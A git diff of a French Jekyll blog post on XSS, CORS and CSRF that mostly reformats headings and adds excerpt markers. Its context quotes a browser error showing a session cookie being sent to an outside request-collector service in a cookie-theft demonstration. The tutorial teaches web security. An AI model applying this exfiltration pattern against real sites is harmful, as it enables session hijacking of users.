@@ -3,10 +3,10 @@ layout: post
 title:  "XSS, CORS, CSRF (Partie 3)"
 date:   2016-08-20
 categories: web
+excerpt_separator: <!--more-->
 ---
-Les requêtes Cross-Site.
-----------
-
+### Les requêtes Cross-Site.
+  
 Bienvenue dans ce dernier volet de notre Saga XSS ([partie 1]({{ site.url }}/xss-cors-csrf-partie-1-xss 
 ), [partie 2]({{ site.url }}/xss-cors-csrf-partie-2-xss-cookies-session)).  
   
@@ -15,6 +15,7 @@ Dans notre précédent article nous avions récupéré un cookie de session insu
 <pre class="alert">
 XMLHttpRequest cannot load http://requestb.in/w7iy5sw7?cookie=PHPSESSID_unsecured=jm5mah0a9uuf4g344096nled73. No 'Access-Control-Allow-Origin' header is present on the requested resource. Origin 'http://localhost' is therefore not allowed access.
 </pre>
+<!--more-->
 <br />
 Alors que nous avions bien réceptionné notre requête sur requestb.in :  
 
